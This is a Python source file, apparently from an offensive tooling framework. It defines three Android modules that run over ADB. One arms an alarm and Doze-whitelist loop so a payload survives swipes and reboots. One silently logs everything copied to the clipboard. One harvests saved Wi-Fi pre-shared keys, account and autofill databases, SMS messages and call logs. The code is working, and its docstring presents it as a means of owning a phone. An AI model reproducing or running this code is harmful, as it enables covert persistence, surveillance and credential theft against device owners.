"""Android persistence: reboot survival, clipboard hijack, credential harvest.

The difference between "I looked at a phone" and "the phone is mine":

* ``android.persist`` arms a repeating wakeup alarm plus a battery whitelist so
  a payload relaunches itself after being swiped away or rebooted — no root.
* ``android.hijack`` polls the clipboard and stores everything that lands in it.
* ``android.creds`` collects saved Wi-Fi PSKs and no-root readable stores.
"""

from __future__ import annotations

import os
import re
import time

from omni.android.modules._base import AndroidModule
from omni.core import config, console
from omni.core.module import Option

__all__ = ["Persist", "Hijack", "Creds"]


class Persist(AndroidModule):
    NAME = "android.persist"
    DESCRIPTION = "Arm a reboot-surviving relaunch loop (alarm + Doze whitelist)"
    OPTIONS = (Option("PACKAGE", "package to keep alive", "", required=True),
               Option("COMPONENT", "package/activity to relaunch"),
               Option("MINUTES", "relaunch period", "15"),
               Option("ACTION", "install|remove|status", "install",
                      choices=("install", "remove", "status")))

    def execute(self) -> dict:
        client = self.adb()
        package = self.get("PACKAGE")
        if self.get("ACTION") == "status":
            out = client.shell_result("dumpsys", "alarm").out
            hits = [ln for ln in out.splitlines() if package in ln]
            for line in hits[:20]:
                console.info(line.strip())
            console.ok(f"{len(hits)} scheduled entr(ies)")
            return {"package": package, "entries": len(hits)}

        if self.get("ACTION") == "remove":
            client.shell("cmd", "alarm", "remove", package)
            client.shell("am", "force-stop", package)
            console.warn(f"persistence removed for {package}")
            return {"package": package, "removed": True}

        minutes = max(1, self.get_int("MINUTES", 15))
        component = self.get("COMPONENT") or package
        client.shell("am", "broadcast", "-a",
                     "android.intent.action.BOOT_COMPLETED", "-p", package)
        client.shell("am", "start", "-n", component)
        client.shell("dumpsys", "deviceidle", "whitelist", f"+{package}")
        client.shell("cmd", "alarm", "set", "--repeat", str(minutes * 60),
                     "RTC_WAKEUP", "0", "am", "start", "-n", component)
        console.ok(f"armed: {component} every {minutes} min, Doze-exempt")
        return {"package": package, "component": component, "minutes": minutes}


class Hijack(AndroidModule):
    NAME = "android.hijack"
    DESCRIPTION = "Watch the clipboard and save everything that lands in it"
    OPTIONS = (Option("SECONDS", "how long to watch", "120"),
               Option("OUT", "output log path"))

    def execute(self) -> dict:
        client = self.adb()
        seconds = max(5, self.get_int("SECONDS", 120))
        path = os.path.expanduser(
            self.get("OUT") or
            os.path.join(config.output_dir("android/clipboard"),
                         f"clip_{time.strftime('%Y%m%d_%H%M%S')}.log"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        console.info(f"watching clipboard for {seconds}s -> {path}")
        seen: list[str] = []
        deadline = time.time() + seconds
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            while time.time() < deadline:
                try:
                    text = client.clipboard_get()
                except Exception:               # noqa: BLE001 - transient
                    text = ""
                if text and text not in seen:
                    seen.append(text)
                    fh.write(f"{time.strftime('%H:%M:%S')}\t{text}\n")
                    fh.flush()
                    console.ok(f"captured: {text[:60]}")
                time.sleep(1.0)
        console.ok(f"{len(seen)} unique clip(s) -> {path}")
        return {"captured": seen, "path": path}


class Creds(AndroidModule):
    NAME = "android.creds"
    DESCRIPTION = "Harvest saved Wi-Fi PSKs, accounts and message stores"
    OPTIONS = (Option("OUT", "output directory"),)

    WIFI_PATHS = ("/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml",
                  "/data/misc/wifi/WifiConfigStore.xml",
                  "/data/misc/wifi/wpa_supplicant.conf")

    def _wifi(self, client) -> str:
        """Read the Wi-Fi store, trying root first then the plain path."""
        for remote in self.WIFI_PATHS:
            body = client.shell_result("su", "-c", "cat", remote).out
            if "SSID" in body:
                return body
            body = client.shell_result("cat", remote).out
            if "SSID" in body:
                return body
        return ""

    def execute(self) -> dict:
        client = self.adb()
        out = os.path.expanduser(self.get("OUT") or
                                 config.output_dir("android/creds"))
        os.makedirs(out, exist_ok=True)
        found: dict[str, str] = {}

        wifi = self._wifi(client)
        if wifi:
            path = os.path.join(out, "wifi_config.txt")
            with open(path, "w", encoding="utf-8", newline="\n") as fh:
                fh.write(wifi)
            ssids = re.findall(r'(?:<string name="SSID">|ssid=")([^"<]+)', wifi)
            psks = re.findall(
                r'(?:<string name="PreSharedKey">|psk=")([^"<]+)', wifi)
            found["wifi"] = path
            found["ssids"] = ",".join(sorted(set(ssids)))
            found["psks"] = ",".join(sorted(set(psks)))
            console.ok(f"{len(set(ssids))} SSID(s), {len(set(psks))} PSK(s)")
        else:
            console.warn("Wi-Fi store unreadable — try root or Android 9-")

        for name, remote in (("accounts.db", "/data/system/users/0/accounts.db"),
                             ("autofill.db", "/data/system/users/0/autofill.db")):
            target = os.path.join(out, name)
            if client.raw("pull", remote, target).ok:
                found[name] = target
                console.ok(f"pulled {remote}")

        for name, uri in (("sms", "content://sms"),
                          ("calllog", "content://call_log/calls")):
            dump = client.shell_result("content", "query", "--uri", uri).out
            if dump.strip():
                target = os.path.join(out, f"{name}.txt")
                with open(target, "w", encoding="utf-8", newline="\n") as fh:
                    fh.write(dump)
                found[name] = target
        console.ok(f"collected {len(found)} artefact(s) -> {out}")
        return found
